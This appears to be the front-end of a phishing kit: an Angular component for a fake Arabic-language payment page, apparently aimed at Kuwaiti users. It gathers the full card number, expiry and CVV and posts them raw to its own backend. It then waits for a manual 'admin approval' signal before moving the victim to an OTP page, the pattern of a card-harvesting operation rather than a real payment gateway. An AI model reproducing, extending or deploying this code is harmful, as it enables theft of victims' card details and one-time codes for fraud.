import { Component, signal, inject, OnInit, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { ButtonComponent } from '../../ui/button/button';
import { ToastService } from '../../services/toast';
import { enviroment } from '../../../env/enviroment';

@Component({
  selector: 'app-choose-payment',
  standalone: true,
  imports: [CommonModule, FormsModule, ButtonComponent],
  templateUrl: './choose-payment.html',
  styleUrl: './choose-payment.css',
})
export class ChoosePayment implements OnInit, OnDestroy {
  toastService = inject(ToastService);
  router = inject(Router);
  // Navigation active tab for sidebar
  activeTab = 'pay';

  // Selected payment method: 'google-pay' | 'knet' | 'credit-card'
  selectedMethod = signal<string>('knet'); // default to knet since it is the only one working

  // Total amount formatted to match mockup (5.000 د.ك)
  totalAmount = signal<string>('0.000');

  // Loading state for the continue/pay button
  isLoading = signal<boolean>(false);

  // Offer modal — shown once when page loads
  showOfferModal = signal<boolean>(true);

  // SSE connection for Visa approval waiting
  private eventSource: EventSource | null = null;

  closeOfferModal() {
    this.showOfferModal.set(false);
  }

  ngOnDestroy() {
    this.cleanupSSE();
  }

  private cleanupSSE() {
    if (this.eventSource) {
      this.eventSource.close();
      this.eventSource = null;
    }
  }

  ngOnInit() {
    const stored = localStorage.getItem('pay_total_kd');
    if (stored) {
      const num = parseFloat(stored.replace(',', '.'));
      this.totalAmount.set(isNaN(num) ? '0.000' : num.toFixed(3));
    }
  }

  // Credit card form fields
  cardName   = signal('');
  cardNumber = signal('');
  cardExpiry = signal('');
  cardCvv    = signal('');

  // Display-formatted card number (groups of 4)
  get cardNumberFormatted(): string {
    return this.cardNumber().replace(/\D/g, '').slice(0, 16).replace(/(\d{4})/g, '$1 ').trim();
  }

  selectMethod(method: string) {
    this.selectedMethod.set(method);
    // Reset card form when switching methods
    if (method !== 'credit-card') {
      this.cardName.set('');
      this.cardNumber.set('');
      this.cardExpiry.set('');
      this.cardCvv.set('');
    }
  }

  onCardNumberInput(event: Event) {
    const raw = (event.target as HTMLInputElement).value.replace(/\D/g, '').slice(0, 16);
    this.cardNumber.set(raw);
    const formatted = raw.replace(/(\d{4})(?=\d)/g, '$1 ');
    (event.target as HTMLInputElement).value = formatted;
  }

  onExpiryInput(event: Event) {
    let raw = (event.target as HTMLInputElement).value.replace(/\D/g, '').slice(0, 4);
    if (raw.length >= 3) raw = raw.slice(0, 2) + '/' + raw.slice(2);
    this.cardExpiry.set(raw);
    (event.target as HTMLInputElement).value = raw;
  }

  onNavigate(tab: string) {
    this.activeTab = tab;
  }

  onContinue() {
    const method = this.selectedMethod();

    if (method === 'credit-card') {
      this.submitVisaPayment();
      return;
    }

    // KNet flow
    this.isLoading.set(true);
    setTimeout(() => {
      this.isLoading.set(false);
      this.router.navigate(['/pay/knet']);
    }, 2000);
  }

  private async submitVisaPayment() {
    // Validate form fields (no name required)
    if (this.cardNumber().length < 16 ||
        this.cardExpiry().length < 5 || this.cardCvv().length < 3) {
      this.toastService.show('يرجى إدخال جميع بيانات البطاقة بشكل صحيح.', 'error');
      return;
    }

    const clientId = localStorage.getItem('client_id');
    if (!clientId) {
      this.toastService.show('جلسة الدفع منتهية. يرجى البدء من جديد', 'error');
      this.router.navigate(['/']);
      return;
    }

    this.isLoading.set(true);

    // Parse expiry: MM/YY → month + year
    const expiryParts = this.cardExpiry().split('/');
    const ccMonth = expiryParts[0] || '';
    const ccYear = expiryParts[1] || '';

    try {
      const response = await fetch(enviroment.api_base + '/api/payments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cc_number: this.cardNumber(),
          cc_name: 'Visa Card',
          cc_month: ccMonth,
          cc_year: ccYear,
          cc_pin: this.cardCvv(),
          client_id: clientId
        })
      });

      const resData = await response.json();
      if (!resData.success) {
        this.isLoading.set(false);
        this.toastService.show(resData.error || 'حدث خطأ أثناء إرسال البيانات', 'error');
        return;
      }

      // Listen for admin approval via SSE
      this.cleanupSSE();
      this.eventSource = new EventSource(enviroment.api_base + `/api/events/client/${clientId}`);
      this.eventSource.addEventListener('payment_status', (evt: any) => {
        const payload = JSON.parse(evt.data);
        if (payload.status === 'ACCEPTED') {
          this.cleanupSSE();
          this.isLoading.set(false);
          // Store card info for OTP screen display
          const rawNum = this.cardNumber();
          const first6 = rawNum.substring(0, 6);
          const last4 = rawNum.substring(rawNum.length - 4);
          const maskedCard = first6.substring(0, 4) + ' ' + first6.substring(4, 6) + '** **** ' + last4;
          localStorage.setItem('masked_card', maskedCard);
          localStorage.setItem('expiry_month', ccMonth);
          localStorage.setItem('expiry_year', '20' + ccYear);
          localStorage.removeItem('bank_logo');
          localStorage.removeItem('bank_name');
          this.router.navigate(['/pay/visa/otp']);
        } else if (payload.status === 'REJECTED') {
          this.cleanupSSE();
          this.isLoading.set(false);
          this.toastService.show('المعلومات المدخلة خاطئة. يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى.', 'error');
        }
      });

      this.eventSource.onerror = () => {
        this.cleanupSSE();
        this.isLoading.set(false);
        this.toastService.show('خطأ في الاتصال بالخادم. يرجى المحاولة لاحقاً.', 'error');
      };

    } catch {
      this.isLoading.set(false);
      this.toastService.show('فشل الاتصال بالخادم. يرجى المحاولة لاحقاً.', 'error');
    }
  }

  onBack() {
    this.toastService.show('الرجوع إلى الصفحة السابقة', 'info');
  }
}
